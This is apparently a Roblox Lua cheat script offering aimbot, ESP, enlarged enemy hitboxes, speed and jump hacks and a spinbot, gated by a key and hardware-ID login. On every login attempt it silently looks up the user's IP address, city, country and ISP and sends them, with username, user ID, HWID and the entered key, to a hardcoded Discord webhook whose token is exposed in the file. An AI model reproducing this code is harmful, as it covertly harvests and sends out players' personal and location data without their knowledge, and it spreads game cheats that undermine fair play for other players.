--[[ 
    V21 - FULL SECURITY (HWID + IP + HITBOX FIX)
    Key Admin: 150711
]]

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local RbxAnalytics = game:GetService("RbxAnalyticsService") -- Necessário para HWID
local Workspace = game:GetService("Workspace")
local Camera = Workspace.CurrentCamera
local Stats = game:GetService("Stats")

-- ==============================================================================
-- 1. CONFIGURAÇÕES
-- ==============================================================================
local ConfigData = {
    KeyUrl = "https://gist.githubusercontent.com/iaacreditando-cmyk/58cf502aa843ffd10f5820c40f9cb850/raw/gistfile1.txt",
    WebhookUrl = "https://ptb.discord.com/api/webhooks/1456729497016729641/fI_YLZWgPW5NCn29odumf7u1KLWsIGhLhtp7clCkk6lIYqo9nxx-QZjWTHQ4lQzGYxRL" -- Use Proxy se necessário
}

local MyHWID = RbxAnalytics:GetClientId()

local Config = {
    Aimbot = true, AimbotKey = Enum.UserInputType.MouseButton2, IsAiming = false,
    FOVSize = 150, ShowFOV = true,
    HitboxSize = 2, ShowHitbox = true,
    Smoothness = 0.1,
    SpeedEnabled = false, ShiftMode = false, IsHoldingShift = false, Speed = 50, Jump = 50,
    ESP = false, TeamCheck = true, WallCheck = true, Spinbot = false, MenuOpen = true
}

-- ==============================================================================
-- 2. FUNÇÕES DE SISTEMA (IP, HWID, LOGS)
-- ==============================================================================
local function trim(s) if not s then return "" end return (s:gsub("^%s*(.-)%s*$", "%1")) end

-- Pega IP e Localização
local function GetUserInfo()
    local success, response = pcall(function() return game:HttpGet("http://ip-api.com/json") end)
    if success then return HttpService:JSONDecode(response) end
    return nil
end

local function GetPing()
    local p = "N/A"
    pcall(function() p = tostring(math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString():split(" ")[1])) .. " ms" end)
    return p
end

-- Webhook Completo (Restaurado)
local function SendLog(keyUsed, status)
    if not ConfigData.WebhookUrl or ConfigData.WebhookUrl:find("SEU_WEBHOOK") or ConfigData.WebhookUrl=="" then return end
    
    local UserData = GetUserInfo()
    local executor = (identifyexecutor and identifyexecutor()) or "Desconhecido"
    
    local ip = UserData and UserData.query or "Falha API"
    local city = UserData and UserData.city or "?"
    local country = UserData and UserData.country or "?"
    local isp = UserData and UserData.isp or "?"

    local embedColor = (status == "SUCESSO") and 65280 or 16711680 -- Verde ou Vermelho

    local data = {
        ["username"] = "V21 Security",
        ["embeds"] = {{
            ["title"] = "🔐 Login: " .. status,
            ["color"] = embedColor,
            ["fields"] = {
                { ["name"] = "👤 Usuário", ["value"] = LocalPlayer.Name .. " ("..LocalPlayer.UserId..")", ["inline"] = false },
                { ["name"] = "🔑 Key", ["value"] = "||"..keyUsed.."||", ["inline"] = true },
                { ["name"] = "💻 HWID", ["value"] = "`"..MyHWID.."`", ["inline"] = true },
                { ["name"] = "📡 IP", ["value"] = "||" .. ip .. "||", ["inline"] = false },
                { ["name"] = "🌍 Local", ["value"] = city .. ", " .. country, ["inline"] = true },
                { ["name"] = "🏢 ISP", ["value"] = isp, ["inline"] = true },
                { ["name"] = "⚙️ Info", ["value"] = "Exec: "..executor.."\nPing: "..GetPing(), ["inline"] = false }
            },
            ["footer"] = { ["text"] = os.date("%d/%m/%Y %H:%M") }
        }}
    }
    
    local req = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
    if req then req({Url=ConfigData.WebhookUrl, Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(data)}) end
end

-- ==============================================================================
-- 3. FUNÇÕES DO CHEAT (ENGINE)
-- ==============================================================================
local function IsEnemy(player)
    if not Config.TeamCheck then return true end
    if player.Team and LocalPlayer.Team and player.Team == LocalPlayer.Team then return false end
    return true
end

local function IsVisible(targetPart)
    if not Config.WallCheck then return true end
    local params = RaycastParams.new(); params.FilterDescendantsInstances = {LocalPlayer.Character, Camera}; params.FilterType = Enum.RaycastFilterType.Exclude
    local res = Workspace:Raycast(Camera.CFrame.Position, targetPart.Position - Camera.CFrame.Position, params)
    if res and res.Instance:IsDescendantOf(targetPart.Parent) then return true end
    return false
end

local function GetRainbowColor() return Color3.fromHSV(os.clock() % 5 / 5, 1, 1) end

local function LoadCheat()
    -- Limpeza
    for _, g in pairs(LocalPlayer.PlayerGui:GetChildren()) do
        if g.Name:find("V2") and g.Name ~= "V21_Login" then g:Destroy() end
    end

    local ScreenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    ScreenGui.Name = "V21_Menu"; ScreenGui.ResetOnSpawn = false

    local MainFrame = Instance.new("Frame", ScreenGui)
    MainFrame.Size = UDim2.new(0, 350, 0, 520); MainFrame.Position = UDim2.new(0.5, -175, 0.5, -260)
    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30); MainFrame.Active = true; MainFrame.Draggable = true

    local UIStroke = Instance.new("UIStroke", MainFrame); UIStroke.Color = Color3.fromRGB(140, 0, 255); UIStroke.Thickness = 2
    Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0, 8)

    local Title = Instance.new("TextLabel", MainFrame); Title.Text = "V21 - SECURITY & HITBOX"; Title.Size = UDim2.new(1, 0, 0, 40); Title.BackgroundTransparency = 1; Title.TextColor3 = Color3.fromRGB(140, 0, 255); Title.Font = Enum.Font.GothamBlack; Title.TextSize = 20

    local Container = Instance.new("ScrollingFrame", MainFrame); Container.Size = UDim2.new(1,-20,1,-50); Container.Position = UDim2.new(0,10,0,45); Container.BackgroundTransparency = 1; Container.ScrollBarThickness = 4; Container.AutomaticCanvasSize = Enum.AutomaticSize.Y
    local List = Instance.new("UIListLayout", Container); List.Padding = UDim.new(0,8); List.SortOrder = Enum.SortOrder.LayoutOrder

    local FovGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui); FovGui.Name="V21_FOV"; FovGui.IgnoreGuiInset=true
    local FOVCircle = Instance.new("Frame", FovGui); FOVCircle.BackgroundTransparency=1; FOVCircle.Visible=true
    local FS = Instance.new("UIStroke", FOVCircle); FS.Color=Color3.fromRGB(140, 0, 255); FS.Thickness=1.5
    Instance.new("UICorner", FOVCircle).CornerRadius=UDim.new(1,0)

    -- UI Helpers
    local function CreateSection(t) local L = Instance.new("TextLabel", Container); L.Text="--- "..t.." ---"; L.Size=UDim2.new(1,0,0,20); L.BackgroundTransparency=1; L.TextColor3=Color3.new(0.6,0.6,0.6) end
    local function CreateButton(t, c, cb) local B = Instance.new("TextButton", Container); B.Size=UDim2.new(1,0,0,35); B.Text=t; B.BackgroundColor3=c; B.TextColor3=Color3.new(1,1,1); Instance.new("UICorner",B).CornerRadius=UDim.new(0,6); B.MouseButton1Click:Connect(function() local nt, nc = cb(); if nt then B.Text=nt end; if nc then B.BackgroundColor3=nc end end) end
    local function CreateSlider(name, min, max, default, callback)
        local F = Instance.new("Frame", Container); F.Size=UDim2.new(1,0,0,50); F.BackgroundTransparency=1; local L = Instance.new("TextLabel", F); L.Text=name..": "..default; L.Size=UDim2.new(1,0,0,20); L.TextColor3=Color3.new(0.9,0.9,0.9); L.BackgroundTransparency=1
        local B = Instance.new("Frame", F); B.Size=UDim2.new(1,0,0,10); B.Position=UDim2.new(0,0,0,25); B.BackgroundColor3=Color3.fromRGB(40,40,40); local Fill = Instance.new("Frame", B); Fill.Size=UDim2.new((default-min)/(max-min),0,1,0); Fill.BackgroundColor3=Color3.fromRGB(140, 0, 255); local Btn = Instance.new("TextButton", B); Btn.Size=UDim2.new(1,0,1,0); Btn.BackgroundTransparency=1; Btn.Text=""
        Btn.MouseButton1Down:Connect(function() local cn = UserInputService.InputChanged:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseMovement then local s = math.clamp((i.Position.X - B.AbsolutePosition.X)/B.AbsoluteSize.X, 0, 1); local v = min + (max-min)*s; v = max>5 and math.floor(v) or math.floor(v*100)/100; Fill.Size=UDim2.new(s,0,1,0); L.Text=name..": "..v; callback(v) end end); UserInputService.InputEnded:Wait(); cn:Disconnect() end)
    end

    -- Menu
    CreateSection("MOVIMENTO")
    CreateButton("Speed Hack: OFF", Color3.fromRGB(45,45,50), function() Config.SpeedEnabled = not Config.SpeedEnabled; return Config.SpeedEnabled and "Speed Hack: ON" or "Speed Hack: OFF", Config.SpeedEnabled and Color3.fromRGB(0,150,0) or Color3.fromRGB(45,45,50) end)
    CreateButton("Usar Shift: OFF", Color3.fromRGB(45,45,50), function() Config.ShiftMode = not Config.ShiftMode; return Config.ShiftMode and "Usar Shift: ON" or "Usar Shift: OFF", Config.ShiftMode and Color3.fromRGB(0,100,255) or Color3.fromRGB(45,45,50) end)
    CreateSlider("Velocidade", 16, 200, 50, function(v) Config.Speed = v end)
    CreateSlider("Pulo", 50, 500, 50, function(v) Config.Jump = v end)

    CreateSection("COMBATE")
    CreateSlider("Hitbox", 2, 50, 2, function(v) Config.HitboxSize = v end)
    CreateSlider("FOV", 10, 800, 150, function(v) Config.FOVSize = v end)
    CreateButton("Aimbot: ON", Color3.fromRGB(0,150,0), function() Config.Aimbot=not Config.Aimbot; return Config.Aimbot and "Aimbot: ON" or "Aimbot: OFF", Config.Aimbot and Color3.fromRGB(0,150,0) or Color3.fromRGB(150,0,0) end)

    CreateSection("VISUAL")
    CreateButton("ESP Nomes: OFF", Color3.fromRGB(45,45,50), function() Config.ESP=not Config.ESP; return Config.ESP and "ESP Nomes: ON" or "ESP Nomes: OFF", Config.ESP and Color3.fromRGB(0,150,0) or Color3.fromRGB(45,45,50) end)
    CreateButton("Ver Hitbox: ON", Color3.fromRGB(0,150,0), function() Config.ShowHitbox=not Config.ShowHitbox; return Config.ShowHitbox and "Ver Hitbox: ON" or "Ver Hitbox: OFF", Config.ShowHitbox and Color3.fromRGB(0,150,0) or Color3.fromRGB(45,45,50) end)
    CreateButton("Spinbot: OFF", Color3.fromRGB(45,45,50), function() Config.Spinbot=not Config.Spinbot; return Config.Spinbot and "Spinbot: ON" or "Spinbot: OFF", Config.Spinbot and Color3.fromRGB(200,0,0) or Color3.fromRGB(45,45,50) end)
    CreateButton("Fechar (Insert)", Color3.fromRGB(30,30,30), function() MainFrame.Visible=false end)

    -- Engines
    RunService.RenderStepped:Connect(function()
        FOVCircle.Size = UDim2.new(0, Config.FOVSize*2, 0, Config.FOVSize*2); FOVCircle.Position = UDim2.new(0, UserInputService:GetMouseLocation().X - Config.FOVSize, 0, UserInputService:GetMouseLocation().Y - Config.FOVSize); FOVCircle.Visible = Config.ShowFOV
        local Target, MinDist, Mouse = nil, Config.FOVSize, UserInputService:GetMouseLocation()
        
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and IsEnemy(p) then
                local head, hum = p.Character:FindFirstChild("Head"), p.Character:FindFirstChild("Humanoid")
                if head and hum and hum.Health > 0 then
                    -- ESP
                    if Config.ESP then
                        local b = head:FindFirstChild("V21ESP") or Instance.new("BillboardGui", head); b.Name="V21ESP"; b.Size=UDim2.new(0,200,0,50); b.StudsOffset=Vector3.new(0,3,0); b.AlwaysOnTop=true
                        local t = b:FindFirstChild("TextLabel") or Instance.new("TextLabel", b); t.Size=UDim2.new(1,0,1,0); t.BackgroundTransparency=1; t.Font=Enum.Font.GothamBold; t.TextStrokeTransparency=0
                        t.Text = p.Name.." ["..math.floor((head.Position-Camera.CFrame.Position).Magnitude).."m]"; t.TextColor3 = p.TeamColor and p.TeamColor.Color or Color3.new(1,1,1)
                    else if head:FindFirstChild("V21ESP") then head.V21ESP:Destroy() end end
                    -- Aimbot
                    if Config.Aimbot then
                        local s, on = Camera:WorldToScreenPoint(head.Position)
                        if on then local d = (Vector2.new(Mouse.X, Mouse.Y) - Vector2.new(s.X, s.Y)).Magnitude; if d < MinDist and (not Config.WallCheck or IsVisible(head)) then Target = head; MinDist = d end end
                    end
                end
            end
        end
        if Target and Config.IsAiming and Config.Aimbot then Camera.CFrame = Camera.CFrame:Lerp(CFrame.new(Camera.CFrame.Position, Target.Position), Config.Smoothness) end
    end)

    RunService.Heartbeat:Connect(function()
        if Config.Spinbot and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then LocalPlayer.Character.HumanoidRootPart.CFrame = LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(50), 0) end
        
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
            local H = LocalPlayer.Character.Humanoid
            if H.JumpPower ~= Config.Jump then H.UseJumpPower=true; H.JumpPower = Config.Jump end
            if Config.SpeedEnabled then
                if Config.ShiftMode then H.WalkSpeed = Config.IsHoldingShift and Config.Speed or 16
                else H.WalkSpeed = Config.Speed end
            end
        end

        local sz = Vector3.new(Config.HitboxSize, Config.HitboxSize, Config.HitboxSize); local expand = Config.HitboxSize > 2.5
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and IsEnemy(p) then
                local hrp, head = p.Character:FindFirstChild("HumanoidRootPart"), p.Character:FindFirstChild("Head")
                if hrp and head then
                    if expand then
                        if (hrp.Size-sz).Magnitude>0.1 then hrp.Size=sz; hrp.Transparency=Config.ShowHitbox and 0.6 or 1; hrp.CanCollide=false; hrp.Material=Enum.Material.Neon; hrp.Color=Color3.fromRGB(150,150,150) end
                        if (head.Size-sz).Magnitude>0.1 then head.Size=sz; head.Transparency=Config.ShowHitbox and 0.6 or 1; head.CanCollide=false; head.Material=Enum.Material.Neon; head.Color=Color3.fromRGB(150,150,150) end
                    else
                        if hrp.Transparency~=1 then hrp.Size=Vector3.new(2,2,1); hrp.Transparency=1; hrp.Material=Enum.Material.Plastic; head.Size=Vector3.new(1.2,1.2,1.2); head.Transparency=0; head.Material=Enum.Material.Plastic end
                    end
                end
            end
        end
    end)

    UserInputService.InputBegan:Connect(function(i) if i.KeyCode==Enum.KeyCode.Insert then MainFrame.Visible=not MainFrame.Visible end; if i.UserInputType==Config.AimbotKey then Config.IsAiming=true end; if i.KeyCode==Enum.KeyCode.LeftShift then Config.IsHoldingShift=true end end)
    UserInputService.InputEnded:Connect(function(i) if i.UserInputType==Config.AimbotKey then Config.IsAiming=false end; if i.KeyCode==Enum.KeyCode.LeftShift then Config.IsHoldingShift=false end end)
end

-- ==============================================================================
-- 4. LOGIN SYSTEM (VERIFICAÇÃO DE HWID RESTAURADA)
-- ==============================================================================
local function VerifyKeyAndHWID(inputKey)
    local keyClean = trim(inputKey)
    
    -- Admin Bypass
    if keyClean == "150711" then return "SUCESSO" end

    -- Verifica na Raw
    local success, response = pcall(function() return game:HttpGet(ConfigData.KeyUrl.."?v="..math.random(1,99999)) end)
    if not success then return "ERRO_HTTP" end

    -- Lógica de Leitura KEY|HWID
    for line in response:gmatch("[^\r\n]+") do
        local parts = line:split("|")
        local dbKey = trim(parts[1])
        local dbHWID = parts[2] and trim(parts[2]) or nil

        -- Se a Key bate
        if dbKey:lower() == keyClean:lower() then
            -- Se tem HWID na lista, verifica se bate com o meu
            if dbHWID then
                if dbHWID == MyHWID then
                    return "SUCESSO"
                else
                    return "HWID_INVALIDO" -- Key certa, PC errado
                end
            else
                return "SUCESSO" -- Key sem HWID atrelado (livre)
            end
        end
    end
    
    return "KEY_INVALIDA"
end

if LocalPlayer.PlayerGui:FindFirstChild("V21Login") then LocalPlayer.PlayerGui.V21Login:Destroy() end
local G = Instance.new("ScreenGui", LocalPlayer.PlayerGui); G.Name="V21Login"
local F = Instance.new("Frame", G); F.Size=UDim2.new(0,300,0,160); F.Position=UDim2.new(0.5,-150,0.5,-80); F.BackgroundColor3=Color3.fromRGB(20,20,20); F.Active=true; F.Draggable=true
Instance.new("UICorner", F)
local T = Instance.new("TextLabel", F); T.Text="V21 SECURITY"; T.Size=UDim2.new(1,0,0,40); T.TextColor3=Color3.fromRGB(140, 0, 255); T.BackgroundTransparency=1; T.Font=Enum.Font.GothamBold; T.TextSize=18
local B = Instance.new("TextBox", F); B.Text=""; B.PlaceholderText="Key..."; B.Size=UDim2.new(0.8,0,0,35); B.Position=UDim2.new(0.1,0,0.35,0); B.BackgroundColor3=Color3.fromRGB(40,40,40); B.TextColor3=Color3.new(1,1,1)
local Btn = Instance.new("TextButton", F); Btn.Text="ENTRAR"; Btn.Size=UDim2.new(0.5,0,0,35); Btn.Position=UDim2.new(0.25,0,0.7,0); Btn.BackgroundColor3=Color3.fromRGB(100, 0, 200); Btn.TextColor3=Color3.new(1,1,1)
local Msg = Instance.new("TextLabel", F); Msg.Text=""; Msg.Size=UDim2.new(1,0,0,20); Msg.Position=UDim2.new(0,0,0.9,0); Msg.BackgroundTransparency=1; Msg.TextColor3=Color3.fromRGB(150,150,150)

Btn.MouseButton1Click:Connect(function()
    Msg.Text = "Verificando..."
    local status = VerifyKeyAndHWID(B.Text)
    
    if status == "SUCESSO" then
        Msg.Text = "SUCESSO!"; Msg.TextColor3 = Color3.new(0,1,0)
        SendLog(B.Text, "SUCESSO")
        task.wait(1); G:Destroy(); task.wait(0.5); LoadCheat()
    elseif status == "HWID_INVALIDO" then
        Msg.Text = "HWID ERRADO!"; Msg.TextColor3 = Color3.new(1,0,0)
        SendLog(B.Text, "FALHA_HWID")
    elseif status == "KEY_INVALIDA" then
        Msg.Text = "KEY INEXISTENTE"; Msg.TextColor3 = Color3.new(1,0,0)
        SendLog(B.Text, "FALHA_KEY")
    else
        Msg.Text = "ERRO CONEXAO"; Msg.TextColor3 = Color3.new(1,1,0)
    end
end)
